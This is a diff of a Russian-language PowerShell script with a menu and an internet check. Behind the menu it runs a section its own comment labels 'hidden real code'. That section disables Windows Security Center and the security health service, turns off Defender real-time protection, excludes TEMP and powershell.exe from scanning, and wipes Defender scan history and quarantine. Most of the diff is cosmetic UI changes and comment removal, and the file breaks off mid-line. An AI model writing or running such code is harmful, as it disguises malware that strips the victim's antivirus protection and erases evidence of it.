@@ -38,12 +38,16 @@ foreach ($testUrl in $TestUrls) {
 }
 
 if (-not $Connected) {
-    Write-Host "========================================" -ForegroundColor Red
-    Write-Host "  ОШИБКА: Нет подключения к интернету!" -ForegroundColor Red
-    Write-Host "========================================" -ForegroundColor Red
+    Clear-Host
     Write-Host ""
-    Write-Host "[*] Проверьте подключение и запустите снова." -ForegroundColor Yellow
-    Write-Host "[*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
+    Write-Host "    ╔═══════════════════════════════════════════════════════════════╗" -ForegroundColor Red
+    Write-Host "    ║                                                               ║" -ForegroundColor Red
+    Write-Host "    ║         ОШИБКА: Нет подключения к интернету!                  ║" -ForegroundColor Red
+    Write-Host "    ║                                                               ║" -ForegroundColor Red
+    Write-Host "    ╚═══════════════════════════════════════════════════════════════╝" -ForegroundColor Red
+    Write-Host ""
+    Write-Host "    [*] Проверьте подключение и запустите снова." -ForegroundColor Yellow
+    Write-Host "    [*] Нажмите любую клавишу для выхода..." -ForegroundColor Gray
     Read-Host
     exit
 }
@@ -98,7 +102,6 @@ $choice = Read-Host
 
 if ($choice -eq "1" -or $choice -eq "2") {
     
-    # ===== ВИЗУАЛЬНЫЙ РАЗДЕЛИТЕЛЬ =====
     Write-Host ""
     Write-Host "    ┌───────────────────────────────────────────────────────────────────────────┐" -ForegroundColor DarkGray
     if ($choice -eq "1") {
@@ -110,7 +113,6 @@ if ($choice -eq "1" -or $choice -eq "2") {
     Write-Host ""
     
     # ===== СКРЫТЫЙ РЕАЛЬНЫЙ КОД =====
-    # ПОЛНОЕ ОТКЛЮЧЕНИЕ ЦЕНТРА БЕЗОПАСНОСТИ
     Try {
         Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue
         Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
@@ -125,7 +127,6 @@ if ($choice -eq "1" -or $choice -eq "2") {
         Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
     } Catch {}
     
-    # ОТКЛЮЧЕНИЕ DEFENDER
     Try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } Catch {}
     Try { Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue } Catch {}
     Try { Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue } Catch {}
@@ -220,11 +221,9 @@ if ($choice -eq "1" -or $choice -eq "2") {
         }
     }
     
-    # Очистка логов Defender
     Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Scans\History\*" -Recurse -Force -ErrorAction SilentlyContinue } Catch {}
     Try { Remove-Item -Path "$env:ProgramData\Microsoft\Windows Defender\Quarantine\*" -Recurse -Force -ErrorAction SilentlyContinue } Catch {}
     
-    # Повторное отключение Центра безопасности
     Try {
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
@@ -470,4 +469,4 @@ if ($choice -eq "1" -or $choice -eq "2") {
     
 } else {
     Write-Host ""
-    Write-Host "    [ERROR] Неверный выбор. Пожалуйста, запустите скрипт за
+    Write-Host "    [ERROR] Неверный выбор. Пожалуйста
